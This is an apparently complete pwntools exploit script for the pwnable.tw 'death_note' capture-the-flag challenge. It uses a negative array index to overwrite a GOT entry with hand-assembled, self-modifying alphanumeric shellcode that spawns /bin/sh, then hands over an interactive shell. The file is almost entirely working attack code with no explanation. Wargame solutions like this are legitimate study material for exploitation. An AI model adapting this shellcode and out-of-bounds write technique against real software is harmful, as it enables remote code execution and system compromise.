#!/usr/bin/python3
from pwn import *

PATH = "./death_note"
HOST, PORT = "chall.pwnable.tw", 10201
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = exe.libc or ELF("libc_32.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '57']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB(gs):
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)
def build_gs():
    return f'''
        b*0x080487B1
        c
    '''


def choice(n):
    sna(b"Your choice :", n)

def add1(index, name):
    choice(1)
    sna(b"Index :", index)
    sa(b"Name :", name)

def show2(index):
    choice(2)
    sna(b"Index :", index)

p = conn()

shellcode = asm(f'''

	push 0x30
	pop eax
	xor al, 0x30
	push eax
	pop ecx

	push ecx
	push {u32(b'//sh')}
	push {u32(b'/bin')}
	push esp
	pop ebx
	
	push edx
	pop eax
	push ecx
	pop edx
	dec edx	
	dec edx
	xor [eax + 39], dl
	xor [eax + 40], dl

	push ecx
	pop edx

	push 0x30
	pop eax
	xor al, 0x3b

''') + b'\x33\x7e'

print(disasm(shellcode))
print("len: ", len(shellcode))

add1(-16, shellcode + b'\n')

p.interactive()
